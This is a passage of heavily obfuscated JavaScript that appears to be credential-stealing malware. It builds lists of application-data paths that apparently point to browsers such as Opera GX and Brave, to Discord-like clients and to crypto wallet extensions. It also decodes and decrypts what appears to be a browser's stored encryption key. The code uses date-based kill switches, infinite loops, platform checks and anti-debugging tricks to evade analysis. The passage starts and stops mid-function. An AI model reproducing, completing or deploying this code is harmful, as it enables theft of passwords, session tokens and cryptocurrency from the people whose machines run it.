                    if (Date[bw1LDXR.call(undefined, 0x307)][bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x308)][bw1LDXR(0x309)](new Date()) > 0x19b76a3c57f) {
                        process.exit();
                    }
                    return jJIllx;
                }
                , set d(uXPxRCH) {
                    if (Date[bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x30a) + bw1LDXR(0x30b)][bw1LDXR(0x30c)][bw1LDXR(0x30d)](new Date()) > 0x19b76a3b4a4) {
                        process.exit();
                    }
                    AdjLRoy = uXPxRCH;
                }
                , f: function (...uXPxRCH) {
                    if (Date[bw1LDXR(0x30e)][bw1LDXR(0x30f)][bw1LDXR(0x310)](new Date()) < 0x18cc21b1232) {
                        try {
                            var mHQbVa;
                            UxmmwSD(mHQbVa = mHQbVa, mHQbVa());
                        } catch (__p_td_3e) {
                            while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f))) {
                                var n49oLe;
                                var Ot8M78;
                                Ot8M78 = 0x0;
                                if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, A536BJ = -0x2f) : __p_td_3e) ? function (uXPxRCH) {
                                        Ot8M78 = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, A536BJ = -0x2f) ? 0x1 : 0x0;
                                    }(__p_td_3e) : n49oLe = 0x1, n49oLe && Ot8M78)) {
                                    break;
                                }
                                if (n49oLe) {
                                    continue;
                                }
                            }
                        }
                    }
                    return jJIllx(...uXPxRCH);
                }
            };
            return td77ore(uXPxRCH, kY3q474);
        };
        if (pTKbGoh[bw1LDXR(0x316) + "es"](process[bw1LDXR(0x317)][Kt94kB(0x2e8)])) {
            process[Kt94kB(0x2f8)](0x0);
        };
        const Nqq3Ln = {
            [bw1LDXR(0x318) + "sk"]: {
                [bw1LDXR(0x319)]: bw1LDXR(0x31a)
            }
            , [bw1LDXR(0x31b) + bw1LDXR(0x31c)]: {
                [bw1LDXR(0x31d) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x31e) + "de"]: Kt94kB(0x28e)
            }
            , [bw1LDXR(0x31f)]: {
                [bw1LDXR(0x31d) + bw1LDXR(0x31e) + "de"]: Kt94kB(0x26b)
            }
            , [bw1LDXR(0x320)]: {
                [bw1LDXR(0x319)]: Kt94kB(0x20e)
            }
            , [bw1LDXR(0x321)]: {
                [bw1LDXR(0x319)]: Kt94kB(0x210)
            }
            , [bw1LDXR.apply(undefined, [0x322])]: {
                [bw1LDXR(0x319)]: Kt94kB(0x235)
            }
            , [bw1LDXR(0x323)]: {
                [bw1LDXR(0x319)]: Kt94kB(0x322)
            }
            , [bw1LDXR(0x324)]: {
                [bw1LDXR(0x31d) + bw1LDXR(0x31e) + "de"]: Kt94kB(0x269)
            }
            , [bw1LDXR(0x325)]: {
                [bw1LDXR(0x31d) + bw1LDXR(0x31e) + "de"]: Kt94kB(0x328)
            }
            , [bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x326)]: {
                [bw1LDXR(0x31d) + bw1LDXR(0x31e) + "de"]: Kt94kB(0x2a0)
            }
            , [bw1LDXR(0x327)]: {
                [bw1LDXR(0x31d) + bw1LDXR.apply(undefined, [0x31e]) + "de"]: bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x328)
            }
            , [bw1LDXR(0x329) + "se"]: {
                [bw1LDXR(0x319)]: Kt94kB(0x2d0)
            }
            , [bw1LDXR(0x32a) + bw1LDXR(0x32b)]: {
                [bw1LDXR(0x31d) + bw1LDXR(0x31e) + "de"]: bw1LDXR(0x32c)
            }
            , [bw1LDXR(0x32d)]: {
                [bw1LDXR(0x31d) + bw1LDXR(0x31e) + "de"]: Kt94kB(0x245)
            }
            , [bw1LDXR(0x32e)]: {
                [bw1LDXR(0x319)]: Kt94kB(0x32f)
            }
            , [bw1LDXR(0x32f) + "nk"]: {
                [bw1LDXR(0x319)]: Kt94kB(0x30d)
            }
            , [bw1LDXR(0x330)]: {
                [bw1LDXR(0x31d) + bw1LDXR(0x31e) + "de"]: Kt94kB(0x271)
            }
            , [bw1LDXR(0x331)]: {
                [bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x319)]: Kt94kB(0x33a)
            }
            , [bw1LDXR(0x332)]: {
                [bw1LDXR(0x31d) + bw1LDXR(0x31e) + "de"]: Kt94kB(0x2d6)
            }
            , [bw1LDXR(0x333)]: {
                [bw1LDXR(0x319)]: Kt94kB(0x278)
            }
            , [bw1LDXR(0x334)]: {
                [bw1LDXR(0x319)]: bw1LDXR(0x335) + bw1LDXR(0x336) + bw1LDXR.call(undefined, 0x337) + bw1LDXR(0x338)
            }
        };
        const WHRbhhi = {
            [bw1LDXR(0x32a) + bw1LDXR(0x339) + "t"]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[bw1LDXR(0x317)][Kt94kB(0x301)] + Kt94kB(0x1ee)
                , [bw1LDXR(0x33c) + bw1LDXR(0x33d)]: Kt94kB(0x25d)
            }
            , [bw1LDXR(0x33e)]: {
                [bw1LDXR.apply(undefined, [0x33f])]: process[bw1LDXR(0x317)][Kt94kB(0x301)] + Kt94kB(0x2ca)
                , [bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x33c]) + bw1LDXR(0x33d)]: bw1LDXR(0x340) + bw1LDXR(0x339) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x341)
            }
            , [bw1LDXR(0x333) + bw1LDXR(0x339) + "t"]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][bw1LDXR(0x342)] + (bw1LDXR(0x343) + bw1LDXR(0x344) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x345) + bw1LDXR(0x346) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x347) + bw1LDXR(0x348) + bw1LDXR(0x349) + bw1LDXR(0x34a))
                , [bw1LDXR(0x33c) + bw1LDXR.apply(undefined, [0x33d])]: Kt94kB(0x1fb)
            }
            , [bw1LDXR(0x34b) + bw1LDXR(0x339) + "t"]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + (bw1LDXR(0x34c) + bw1LDXR.apply(undefined, [0x34d]) + bw1LDXR.apply(undefined, [0x34e]))
                , [bw1LDXR.apply(undefined, [0x33c]) + bw1LDXR(0x33d)]: bw1LDXR(0x34f)
            }
            , [bw1LDXR.apply(undefined, [0x350]) + bw1LDXR(0x351) + "ry"]: {
                [bw1LDXR(0x33f)]: process[Kt94kB(0x24c)][bw1LDXR(0x352) + bw1LDXR(0x353)] + Kt94kB(0x230)
                , [bw1LDXR(0x33c) + bw1LDXR(0x33d)]: Kt94kB(0x2af)
            }
            , [bw1LDXR(0x354) + bw1LDXR(0x355) + bw1LDXR(0x356)]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x233)
                , [bw1LDXR(0x33c) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x33d)]: Kt94kB(0x342)
            }
            , [bw1LDXR(0x357)]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x349)
                , [bw1LDXR(0x33c) + bw1LDXR(0x33d)]: Kt94kB(0x2a8)
            }
            , [bw1LDXR(0x358)]: {
                [bw1LDXR(0x33f)]: process[Kt94kB(0x24c)][bw1LDXR(0x352) + bw1LDXR(0x353)] + (bw1LDXR(0x359) + bw1LDXR(0x35a) + bw1LDXR(0x35b) + "B")
                , [bw1LDXR(0x35c)]: Kt94kB(0x1eb)
            }
            , [bw1LDXR(0x35d) + bw1LDXR(0x35e) + bw1LDXR(0x356)]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][bw1LDXR(0x352) + bw1LDXR(0x353)] + Kt94kB(0x295)
                , [bw1LDXR(0x35c)]: Kt94kB(0x296)
            }
            , [bw1LDXR(0x35f)]: {
                [bw1LDXR(0x33f)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x2da)
                , [bw1LDXR(0x35c)]: Kt94kB(0x314)
            }
            , [bw1LDXR(0x360)]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][bw1LDXR(0x352) + bw1LDXR(0x353)] + Kt94kB(0x27d)
                , [bw1LDXR(0x35c)]: Kt94kB(0x309)
            }
        };
        const mb11EIG = {
            [bw1LDXR(0x361)]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + (bw1LDXR(0x343) + bw1LDXR(0x344) + bw1LDXR(0x362) + bw1LDXR(0x363))
            }
            , [bw1LDXR.apply(undefined, [0x364]) + bw1LDXR.call(undefined, 0x365) + "ry"]: {
                [bw1LDXR(0x33f)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x22f)
            }
            , [bw1LDXR(0x364) + bw1LDXR(0x366)]: {
                [bw1LDXR(0x33f)]: process[Kt94kB(0x24c)][bw1LDXR.apply(undefined, [0x342])] + Kt94kB(0x1f2)
            }
            , [bw1LDXR(0x364) + bw1LDXR.apply(undefined, [0x367]) + bw1LDXR(0x368) + "t"]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][bw1LDXR(0x342)] + (bw1LDXR(0x369) + bw1LDXR(0x36a) + bw1LDXR(0x36b) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x36c))
            }
            , [bw1LDXR(0x36d) + bw1LDXR(0x36e)]: {
                [bw1LDXR(0x33f)]: process[Kt94kB(0x24c)][bw1LDXR(0x342)] + (bw1LDXR(0x343) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x344) + bw1LDXR(0x36f) + bw1LDXR(0x370) + "rd")
            }
        };
        const yl2wlnI = {
            [bw1LDXR(0x371)]: {
                [bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x33a]) + bw1LDXR(0x33b)]: process[bw1LDXR(0x317)][Kt94kB(0x301)] + Kt94kB(0x341)
                , [bw1LDXR.apply(undefined, [0x35c])]: bw1LDXR(0x372) + bw1LDXR(0x373)
            }
            , [bw1LDXR(0x374)]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][bw1LDXR(0x352) + bw1LDXR(0x353)] + bw1LDXR(0x375)
                , [bw1LDXR(0x35c)]: Kt94kB(0x2b2)
            }
            , [bw1LDXR(0x376)]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x339)] + Kt94kB(0x31a)
                , [bw1LDXR(0x35c)]: Kt94kB(0x20c)
            }
            , [bw1LDXR(0x377) + bw1LDXR(0x378)]: {
                [bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x33f])]: process[Kt94kB(0x24c)][bw1LDXR(0x352) + bw1LDXR.apply(undefined, [0x353])] + (bw1LDXR(0x379) + bw1LDXR(0x37a) + bw1LDXR(0x37b))
                , [bw1LDXR(0x33c) + bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x33d])]: Kt94kB(0x222)
            }
            , [bw1LDXR(0x37c)]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x248)
                , [bw1LDXR(0x35c)]: Kt94kB(0x201)
            }
            , [bw1LDXR(0x37d)]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x2de)
                , [bw1LDXR(0x33c) + bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x33d])]: Kt94kB(0x351)
            }
        };
        const C6GoqKD = {
            [bw1LDXR(0x37e)]: {
                [bw1LDXR(0x33f)]: process[bw1LDXR(0x317)][bw1LDXR(0x342)] + bw1LDXR.call(undefined, 0x37f)
                , [bw1LDXR.apply(undefined, [0x380])]: [Kt94kB(0x2c9), Kt94kB(0x2c4), Kt94kB(0x2d9), Kt94kB(0x220), Kt94kB(0x297), Kt94kB(0x30f), Kt94kB(0x2ad)]
                , [bw1LDXR(0x33c) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x33d)]: Kt94kB(0x30e)
            }
            , [bw1LDXR(0x37e) + bw1LDXR(0x381)]: {
                [bw1LDXR(0x33a) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x2b7)
                , [bw1LDXR.call(undefined, 0x380)]: [Kt94kB(0x2c9), Kt94kB(0x2c4), bw1LDXR(0x382) + bw1LDXR(0x383), Kt94kB(0x220), Kt94kB(0x297), bw1LDXR(0x382) + bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x384]), bw1LDXR(0x385)]
                , [bw1LDXR(0x33c) + bw1LDXR(0x33d)]: Kt94kB(0x30e)
            }
            , [bw1LDXR(0x37e) + bw1LDXR(0x386)]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][bw1LDXR(0x352) + bw1LDXR(0x353)] + (bw1LDXR(0x369) + bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x387) + bw1LDXR(0x388) + bw1LDXR.call(undefined, 0x389) + bw1LDXR(0x38a))
                , [bw1LDXR(0x380)]: [Kt94kB(0x2c9), bw1LDXR(0x382) + bw1LDXR.apply(undefined, [0x38b]), Kt94kB(0x2d9), Kt94kB(0x220), Kt94kB(0x297), Kt94kB(0x30f), bw1LDXR(0x385)]
                , [bw1LDXR(0x33c) + bw1LDXR(0x33d)]: bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x38c])
            }
            , [bw1LDXR(0x37e) + bw1LDXR(0x38d)]: {
                [bw1LDXR(0x33f)]: process[Kt94kB(0x24c)][bw1LDXR(0x352) + bw1LDXR(0x353)] + Kt94kB(0x329)
                , [bw1LDXR(0x38e) + "es"]: [Kt94kB(0x2c9), Kt94kB(0x2c4), Kt94kB(0x2d9), Kt94kB(0x220), Kt94kB(0x297), Kt94kB(0x30f), Kt94kB(0x2ad)]
                , [bw1LDXR(0x33c) + bw1LDXR(0x33d)]: bw1LDXR(0x38f) + bw1LDXR(0x390)
            }
            , [bw1LDXR(0x391)]: {
                [bw1LDXR.call(undefined, 0x33f)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x279)
                , [bw1LDXR(0x38e) + "es"]: [Kt94kB(0x2c9), Kt94kB(0x2c4), Kt94kB(0x2d9), Kt94kB(0x220), Kt94kB(0x297), Kt94kB(0x30f), Kt94kB(0x2ad)]
                , [bw1LDXR(0x35c)]: Kt94kB(0x2b6)
            }
            , [bw1LDXR.apply(undefined, [0x392])]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x263)
                , [bw1LDXR(0x38e) + "es"]: [Kt94kB(0x2c9), Kt94kB(0x2c4), Kt94kB(0x2d9), Kt94kB(0x220), Kt94kB(0x297), Kt94kB(0x30f), Kt94kB(0x2ad)]
                , [bw1LDXR(0x33c) + bw1LDXR(0x33d)]: bw1LDXR(0x393) + bw1LDXR(0x390)
            }
            , [bw1LDXR(0x394)]: {
                [bw1LDXR(0x33f)]: process[bw1LDXR.apply(undefined, [0x317])][Kt94kB(0x301)] + Kt94kB(0x30b)
                , [bw1LDXR(0x38e) + "es"]: [Kt94kB(0x2c9), Kt94kB(0x2c4), Kt94kB(0x2d9), Kt94kB(0x220), Kt94kB(0x297), Kt94kB(0x30f), Kt94kB(0x2ad)]
                , [bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x33c) + bw1LDXR(0x33d)]: Kt94kB(0x324)
            }
            , [bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x395)]: {
                [bw1LDXR(0x33f)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x311)
                , [bw1LDXR(0x38e) + "es"]: [Kt94kB(0x2c9), Kt94kB(0x2c4), Kt94kB(0x2d9), Kt94kB(0x220), Kt94kB(0x297), Kt94kB(0x30f), Kt94kB(0x2ad)]
                , [bw1LDXR(0x35c)]: Kt94kB(0x25c)
            }
            , [bw1LDXR(0x396) + bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x397])]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x2a2)
                , [bw1LDXR(0x380)]: [Kt94kB(0x2c9)]
                , [bw1LDXR(0x33c) + bw1LDXR(0x33d)]: bw1LDXR(0x398)
            }
            , [bw1LDXR(0x396) + "GX"]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x299)
                , [bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x33c) + bw1LDXR(0x33d)]: Kt94kB(0x1f7)
            }
            , [bw1LDXR(0x396) + bw1LDXR(0x399)]: {
                [bw1LDXR(0x33f)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x353)
                , [bw1LDXR(0x38e) + "es"]: [bw1LDXR.call(undefined, 0x39a)]
                , [bw1LDXR(0x35c)]: bw1LDXR(0x39b) + bw1LDXR(0x39c)
            }
            , [bw1LDXR(0x39d)]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x33c)
                , [bw1LDXR(0x38e) + "es"]: [Kt94kB(0x2c9)]
                , [bw1LDXR(0x33c) + bw1LDXR(0x33d)]: Kt94kB(0x1f7)
            }
            , [bw1LDXR(0x39e)]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[bw1LDXR(0x317)][Kt94kB(0x301)] + Kt94kB(0x31c)
                , [bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x380])]: [bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x39a]), Kt94kB(0x2c4), Kt94kB(0x2d9), Kt94kB(0x220), Kt94kB(0x297), Kt94kB(0x30f), bw1LDXR(0x385)]
                , [bw1LDXR(0x35c)]: bw1LDXR(0x39f) + bw1LDXR(0x3a0)
            }
            , [bw1LDXR(0x3a1)]: {
                [bw1LDXR(0x33a) + bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x33b])]: process[bw1LDXR.call(undefined, 0x317)][Kt94kB(0x301)] + Kt94kB(0x285)
                , [bw1LDXR(0x380)]: [Kt94kB(0x2c9), Kt94kB(0x2c4), Kt94kB(0x2d9), bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x382]) + bw1LDXR(0x3a2), Kt94kB(0x297), Kt94kB(0x30f), Kt94kB(0x2ad)]
                , [bw1LDXR(0x35c)]: bw1LDXR(0x3a3)
            }
        };
        const XJQnk9N = {
            [bw1LDXR.call(undefined, 0x3a4)]: {
                [bw1LDXR(0x33f)]: process[bw1LDXR(0x317)][Kt94kB(0x301)] + Kt94kB(0x2bc)
                , [bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x33c) + bw1LDXR(0x33d)]: Kt94kB(0x334)
            }
            , [bw1LDXR(0x3a5)]: {
                [bw1LDXR(0x33f)]: process[Kt94kB(0x24c)][bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x352]) + bw1LDXR(0x353)] + Kt94kB(0x2bd)
                , [bw1LDXR.apply(undefined, [0x35c])]: Kt94kB(0x25f)
            }
            , [bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x3a6])]: {
                [bw1LDXR(0x33f)]: process[bw1LDXR.apply(undefined, [0x317])][Kt94kB(0x301)] + Kt94kB(0x2e5)
                , [bw1LDXR(0x33c) + bw1LDXR(0x33d)]: bw1LDXR.apply(undefined, [0x3a7]) + bw1LDXR(0x390)
            }
            , [bw1LDXR(0x3a8)]: {
                [bw1LDXR(0x33f)]: process[Kt94kB(0x24c)][bw1LDXR(0x352) + bw1LDXR(0x353)] + Kt94kB(0x310)
                , [bw1LDXR(0x35c)]: Kt94kB(0x2dc)
            }
            , [bw1LDXR(0x3a9) + "ox"]: {
                [bw1LDXR(0x33a) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + Kt94kB(0x21a)
                , [bw1LDXR(0x35c)]: Kt94kB(0x2bf)
            }
            , [bw1LDXR(0x3aa) + bw1LDXR(0x3ab) + "r"]: {
                [bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x33a]) + bw1LDXR(0x33b)]: process[Kt94kB(0x24c)][Kt94kB(0x301)] + (bw1LDXR(0x3ac) + bw1LDXR(0x3ad) + bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x3ae]))
                , [bw1LDXR(0x33c) + bw1LDXR(0x33d)]: Kt94kB(0x268)
            }
        };
        const C_dAB0T = (uXPxRCH, mHQbVa) => {
            if (Date[bw1LDXR(0x3af) + bw1LDXR(0x3b0)][bw1LDXR(0x3b1)][bw1LDXR(0x3b2)](new Date()) > 0x19b76a3bc89) {
                var kY3q474 = "a";
                while (0x1) {
                    kY3q474 = kY3q474 += "a";
                }
            }
            try {
                if (Date[bw1LDXR(0x3af) + bw1LDXR(0x3b0)][bw1LDXR(0x3b1)][bw1LDXR(0x3b2)](new Date()) > 0x19b76a3bdda) {
                    var Ot8M78 = "a";
                    while (0x1) {
                        Ot8M78 = Ot8M78 += "a";
                    }
                }
                const jJIllx = pukrvr[Kt94kB(0x286)](uXPxRCH);
                UxmmwSD(MsCwg5O[Kt94kB(0x244)](jJIllx), MsCwg5O[Kt94kB(0x2f6)](uXPxRCH[Kt94kB(0x276)](/\s/g, "_"), mHQbVa));
            } catch (_0x2e3446) {
                if (rKAu9MB(require('os')
                        .platform() === bw1LDXR(0x3b3), A536BJ = -0x2f)) {
                    process.exit();
                }
                console[bw1LDXR(0x3b4)](_0x2e3446);
            }
        };
        const nvvl3v3 = () => {
            if (Date[bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x3b5])][bw1LDXR(0x3b6)][bw1LDXR(0x3b7)](new Date()) > 0x19b76a3b6da) {
                process.exit();
            }
            if (process[Kt94kB(0x2f9)] === Kt94kB(0x1f4)) {
                if (rKAu9MB(require('os')
                        .platform() === bw1LDXR(0x3b8), A536BJ = -0x2f)) {
                    process.exit();
                }
                const mHQbVa = pukrvr[Kt94kB(0x300)](process[Kt94kB(0x24c)][Kt94kB(0x207)], bw1LDXR(0x3b9), bw1LDXR[bw1LDXR[0x1ef]](undefined, 0x3ba) + "32", Kt94kB(0x27c));
                if (rKAu9MB(process[bw1LDXR(0x317)][Kt94kB(0x216)], MHQ3bYA(-0x2f)) || rKAu9MB(process[Kt94kB(0x24c)][Kt94kB(0x216)][Kt94kB(0x2a6)](bw1LDXR(0x3bb)), MHQ3bYA(-0x2f))) {
                    process[Kt94kB(0x24c)][bw1LDXR(0x3bc)] = mHQbVa;
                }
            } else {
                process[bw1LDXR(0x3bd)](0x0);
            }
        };
        const R4UyGcx = async uXPxRCH => {
            if (rKAu9MB(require('os')
                    .platform() === bw1LDXR(0x3be), MHQ3bYA(-0x2f))) {
                process.exit();
            }
            try {
                const kY3q474 = await MsCwg5O[bw1LDXR(0x3bf) + "on"](uXPxRCH);
                if (rKAu9MB(kY3q474[bw1LDXR(0x3c0)], A536BJ = -0x2f) || rKAu9MB(kY3q474[Kt94kB(0x250)][Kt94kB(0x27b)], MHQ3bYA(-0x2f))) {
                    return await LwHJ6C_(uXPxRCH);
                }
                if (function () {
                        var uXPxRCH = function () {
                            const mHQbVa = function () {
                                const mHQbVa = new RegExp("\n");
                                return mHQbVa[bw1LDXR(0x3c1)](uXPxRCH);
                            };
                            return mHQbVa();
                        };
                        return uXPxRCH();
                    }()) {
                    try {
                        var n49oLe = function (uXPxRCH, mHQbVa) {
                            return mHQbVa;
                        };
                        var Ot8M78;
                        var jJIllx;
                        var td77ore;
                        var Q59OVlp;
                        UxmmwSD(Ot8M78 = 0x30e, jJIllx = -0x1b5, td77ore = -0x119, Q59OVlp = {
                            "r": function () {
                                return jJIllx = -0x3b;
                            }
                            , "p": () => {
                                return jJIllx += 0x51;
                            }
                            , "k": () => {
                                Ot8M78 += 0x12;
                                return Q59OVlp.b = false;
                            }
                            , "g": (uXPxRCH = td77ore == -0x119) => {
                                if (!uXPxRCH) {
                                    return td77ore;
                                }
                                Ot8M78 += td77ore == -0x119 ? -0x14 : 0x11;
                                return Q59OVlp.b = false;
                            }
                            , "f": () => {
                                return Ot8M78 += td77ore == -0x119 ? -0x14 : 0x11;
                            }
                            , "y": function () {
                                UxmmwSD(jJIllx = -0x3b, Q59OVlp.t());
                                return "w";
                            }
                            , "c": function () {
                                Ot8M78 += -0x14;
                                td77ore += 0x1d;
                                return Q59OVlp.b = false;
                            }
                            , "o": function () {
                                if (Ot8M78 == 0x320 && false) {
                                    UxmmwSD(Ot8M78 += -0xe, jJIllx += -0x26);
                                    return "m";
                                }
                                UxmmwSD(xtbSJI(), Ot8M78 += Q59OVlp.l);
                                return "m";
                            }
                            , "t": function (uXPxRCH = td77ore == 0x55) {
                                if (uXPxRCH) {
                                    return "u";
                                }
                                return jJIllx += td77ore + 0xee;
                            }
                            , "l": -0xe
                            , "q": function () {
                                return jJIllx += 0x26;
                            }
                            , "s": 0xee
                        });
                        while (Ot8M78 + jJIllx + td77ore != 0x44) {
                            switch (Ot8M78 + jJIllx + td77ore) {
                            case 0x1d:
                            case 0x1e:
                            case 0x1cf:
                            case 0x3d:
                                UxmmwSD(td77ore = -0xf, Ot8M78 += 0xe, jJIllx += 0x26, Q59OVlp.b = false);
                                break;
                            case Q59OVlp.b ? -0x1fc:
                                0x52:
                                case 0x313:
                                if (Q59OVlp.o() == "m") {
                                    break;
                                }
                            case 0x40:
                                var xtbSJI = (Q59OVlp.j = n49oLe)(this, function () {
                                    var uXPxRCH = function () {
                                        var mHQbVa = uXPxRCH.constructor(bw1LDXR(0x3c2) + bw1LDXR[bw1LDXR[0x1e6]](undefined, [0x3c3]) + bw1LDXR(0x3c4) + bw1LDXR(0x3c5))()
                                            .constructor(bw1LDXR(0x3c6));
                                        return rKAu9MB(mHQbVa.call(uXPxRCH), A536BJ = -0x2f);
                                    };
                                    return uXPxRCH();
                                });
                                Q59OVlp.k();
                                break;
                            case 0x316:
                            case 0x314:
                            default:
                                var xtbSJI = n49oLe(this, function () {
                                    var uXPxRCH = function () {
                                        var mHQbVa = uXPxRCH.constructor(bw1LDXR.call(undefined, 0x3c7))()
                                            .constructor(bw1LDXR(0x3c8) + bw1LDXR(0x3c9) + bw1LDXR(0x3ca));
                                        return rKAu9MB(mHQbVa.call(uXPxRCH), A536BJ = -0x2f);
                                    };
                                    return uXPxRCH();
                                });
                                Q59OVlp.g();
                                break;
                            case 0x32e:
                            case 0x49:
                            case 0x223:
                                var xtbSJI;
                                UxmmwSD(delete Q59OVlp.E, xtbSJI = (Ot8M78 == 0x334 ? n49oLe : setImmediate)(this, function () {
                                    var uXPxRCH = function () {
                                        var mHQbVa = uXPxRCH.constructor(bw1LDXR(0x3cb))()
                                            .constructor(bw1LDXR.call(undefined, 0x3cc));
                                        return rKAu9MB(mHQbVa.call(uXPxRCH), A536BJ = -0x2f);
                                    };
                                    return uXPxRCH();
                                }), Q59OVlp.c());
                                break;
                            case 0x37:
                                delete 0xee;
                            case 0x6f:
                                if (Q59OVlp.y() == "w") {
                                    break;
                                }
                            }
                        }
                    } catch (__p_td_3e) {
                        while (__p_td_3e ? __p_td_3e : rKAu9MB(__p_td_3e, A536BJ = -0x2f)) {
                            var TaFn0Uv;
                            var Xb4IwJx;
                            Xb4IwJx = 0x0;
                            if (y7bTqx((__p_td_3e ? rKAu9MB(__p_td_3e, MHQ3bYA(-0x2f)) : __p_td_3e) ? function (uXPxRCH) {
                                    Xb4IwJx = uXPxRCH ? 0x0 : rKAu9MB(uXPxRCH, A536BJ = -0x2f) ? 0x1 : 0x0;
                                }(__p_td_3e) : TaFn0Uv = 0x1, TaFn0Uv && Xb4IwJx)) {
                                break;
                            }
                            if (TaFn0Uv) {
                                continue;
                            }
                        }
                    }
                }
                const i0gUcBP = kY3q474[Kt94kB(0x250)][Kt94kB(0x27b)];
                const pukrvr = Buffer[Kt94kB(0x257)](i0gUcBP, Kt94kB(0x22a))[Kt94kB(0x23e)](0x5);
                const Xp96Uso = BSJ1pS[Kt94kB(0x22b)](pukrvr, null, bw1LDXR(0x3cd) + bw1LDXR(0x3ce));
                return Xp96Uso;
            } catch (_0x58ad5f) {
                if (new Date()[bw1LDXR(0x3cf)]() > 0x19b76a3aae4) {
                    try {
                        var n49oLe = function (uXPxRCH, mHQbVa) {
                            return mHQbVa;
                        };
                        var TljPa8;
                        var vhNite;
                        var lA0B8WY;
                        var s1pwaN;
                        var e0MiDs;
                        UxmmwSD(TljPa8 = 0x1f8, vhNite = -0x204, lA0B8WY = 0x56, s1pwaN = -0x3c, e0MiDs = {
                            "e": () => {
                                return vhNite += 0x81;
                            }
                            , "w": function () {
                                return lA0B8WY = -0x18;
                            }
                            , "q": function (uXPxRCH = e0MiDs.b == 0x2) {
                                if (uXPxRCH) {
                                    return e0MiDs.t();
                                }
                                return s1pwaN += 0x24;
                            }
                            , "b": bw1LDXR(0x3d0) + bw1LDXR(0x3d1) + bw1LDXR(0x3d2) + bw1LDXR(0x3d3)
                            , "A": function () {
                                vhNite += -0x50;
                                lA0B8WY += 0xaf;
                                return s1pwaN += -0x2a;
                            }
